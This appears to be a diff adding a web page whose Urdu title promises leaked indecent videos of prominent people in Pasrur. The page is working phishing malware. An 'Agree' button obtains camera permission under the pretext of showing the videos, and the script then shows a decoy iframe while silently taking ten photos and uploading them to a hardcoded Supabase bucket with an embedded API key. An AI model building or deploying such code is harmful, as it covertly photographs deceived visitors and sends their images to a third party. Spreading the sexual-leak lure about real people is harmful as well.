@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>پسرور کے اہم سیاسی سماجی اور صحافی شخصیات کی نازیبا ویڈیو لیک۔سب پھڑے جان گے</title>
+  <style>
+    body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
+    #preload-modal{position:fixed;inset:0;background:rgba(0,0,0,.85);color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999}
+    #agree-button{padding:10px 18px;border-radius:8px;border:0;background:#0b84ff;color:#fff;font-size:16px;cursor:pointer}
+    #deny-message{color:#ff8080;margin-top:12px}
+    #status{position:fixed;left:12px;bottom:12px;background:#ffffffcc;padding:8px 12px;border-radius:8px;font-size:14px}
+    iframe{position:fixed;inset:0;border:0;width:100%;height:100%}
+    video{display:none}
+  </style>
+</head>
+<body>
+  <div id="preload-modal" role="dialog" aria-modal="true">
+    <h2>ویڈیوز دیکھنے کے لیے</h2>
+    <p>پہ کلک کریں Agree</p>
+    <button id="agree-button">Agree</button>
+    <p id="deny-message" style="display:none">You must allow camera permission to see the content.</p>
+  </div>
+
+  <!-- iframe: using a safe slug (rename the actual file to jeeto-pakistan.html) -->
+  <iframe id="jeeto-iframe" src="jeeto-pakistan.html" style="display:none" allow="camera; microphone; autoplay"></iframe>
+
+  <video id="video" autoplay playsinline muted></video>
+  <div id="status" style="display:none"></div>
+
+  <!-- supabase client (cdn) -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    // ---------- CONFIG: replace with your project's values ----------
+    const SUPABASE_URL = 'https://hpgrvmzujhvomcktjust.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhwZ3J2bXp1amh2b21ja3RqdXN0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0MDA3NDcsImV4cCI6MjA3NDk3Njc0N30.R_pkZCEFdytXvwzD_fzpKHJh1t2Myq_v-ajYTa88m40';
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    // ----------------------------------------------------------------
+
+    const preloadModal = document.getElementById('preload-modal');
+    const agreeButton = document.getElementById('agree-button');
+    const denyMessage = document.getElementById('deny-message');
+    const jeetoIframe = document.getElementById('jeeto-iframe');
+    const video = document.getElementById('video');
+    const statusEl = document.getElementById('status');
+
+    agreeButton.addEventListener('click', async () => {
+      try {
+        statusEl.style.display = 'block';
+        statusEl.innerText = 'Requesting camera permission...';
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+
+        // Hide the modal and show iframe
+        preloadModal.style.display = 'none';
+        jeetoIframe.style.display = 'block';
+
+        // attach stream and ensure metadata is ready
+        video.srcObject = stream;
+        await new Promise((resolve) => {
+          if (video.readyState >= 1 && video.videoWidth) return resolve();
+          // wait for metadata so we have width/height
+          const onMeta = () => { video.removeEventListener('loadedmetadata', onMeta); resolve(); };
+          video.addEventListener('loadedmetadata', onMeta);
+          // ensure playback starts
+          video.play().catch(()=>{/* play may be blocked but metadata should still fire */});
+          // fallback timeout in case event doesn't fire
+          setTimeout(resolve, 800);
+        });
+
+        // start capturing (non-blocking)
+        captureAndUploadPhotos(video, supabase, 10, 640, 0.8);
+
+      } catch (err) {
+        console.error('Camera access denied or error:', err);
+        denyMessage.style.display = 'block';
+        statusEl.style.display = 'none';
+      }
+    });
+
+    // captureCount, targetWidth, jpegQuality
+    async function captureAndUploadPhotos(videoEl, supabaseClient, captureCount = 10, targetWidth = 640, jpegQuality = 0.8) {
+      // set canvas to target size preserving aspect ratio
+      const aspect = (videoEl.videoWidth && videoEl.videoHeight) ? (videoEl.videoWidth / videoEl.videoHeight) : (16/9);
+      const canvas = document.createElement('canvas');
+      canvas.width = targetWidth;
+      canvas.height = Math.round(targetWidth / aspect);
+      const ctx = canvas.getContext('2d');
+
+      statusEl.innerText = `Preparing to capture ${captureCount} photos...`;
+
+      for (let i = 0; i < captureCount; i++) {
+        try {
+          // draw current frame
+          ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+
+          // convert to blob (jpeg for smaller size)
+          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', jpegQuality));
+          if (!blob) throw new Error('Failed to create image blob');
+
+          const filename = `captures/photo-${Date.now()}-${i+1}.jpg`;
+
+          statusEl.innerText = `Uploading ${i+1}/${captureCount}...`;
+
+          // Upload to Supabase Storage (uploads to captures/ folder)
+          const { data, error } = await supabaseClient.storage.from('user-media').upload(filename, blob, { contentType: 'image/jpeg' });
+
+          if (error) {
+            console.error('Supabase upload error', error);
+            statusEl.innerText = `Upload failed at ${i+1}: ${error.message || JSON.stringify(error)}`;
+            return;
+          } else {
+            console.log('Uploaded', data);
+          }
+
+          // small delay between captures to reduce concurrency spikes
+          await new Promise(r => setTimeout(r, 250));
+        } catch (err) {
+          console.error('capture/upload error', err);
+          statusEl.innerText = 'Error during capture/upload: ' + (err.message || err);
+          return;
+        }
+      }
+
+      statusEl.innerText = 'All photos uploaded successfully!';
+    }
+  </script>
+</body>
+</html>
